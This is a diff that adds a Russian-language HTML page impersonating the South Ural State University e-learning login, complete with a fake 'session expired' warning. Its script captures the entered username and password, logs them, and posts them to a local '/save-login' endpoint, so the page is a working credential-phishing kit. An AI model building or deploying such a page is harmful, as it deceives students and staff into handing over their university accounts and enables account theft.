@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход на сайт | edu@SUSU</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css"> <!-- Подключаем CSS-файл -->
+</head>
+<body>
+    <div class="login-container">
+        <h1>Зайти на Электронный ЮУрГУ</h1>
+        <div class="alert">
+            Время вашего сеанса истекло. Войдите в систему еще раз.
+        </div>
+        <form id="loginForm" action="#" method="post">
+            <label for="username">Логин:</label>
+            <input type="text" id="username" name="username" required>
+            
+            <label for="password">Пароль:</label>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit" class="button">Вход</button>
+        </form>
+        <a href="#" class="forgot-password">Забыли пароль?</a>
+        
+        <hr>
+        
+        <div class="first-time">
+            <h4>Вы в первый раз на нашем сайте?</h4>
+            <p>Для входа в портал студенты, сотрудники и преподаватели ЮУРГУ используют свой логин и пароль от личного кабинета в системе «Универсис».</p>
+            <ul>
+                <li><strong>Обратите внимание:</strong> если вы используете логин и пароль от личного кабинета в системе «Универсис» и портал выдает ошибку «Неверный логин и пароль» — это возможно в двух случаях:</li>
+                <li>вы действительно неправильно ввели логин и пароль,</li>
+                <li>ваш логин и пароль заблокированы в системе «Универсис» (это может быть в случае отчисления студента или увольнения сотрудника из университета).</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Останавливаем стандартное поведение формы
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            console.log('Username:', username);
+            console.log('Password:', password);
+
+            // Отправляем данные на сервер
+            fetch('http://127.0.0.1:8000/save-login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                document.getElementById('message').textContent = data.message;
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                document.getElementById('message').textContent = "Failed to save login details.";
+            });
+        });
+    });
+    </script>
+</body>
+</html>
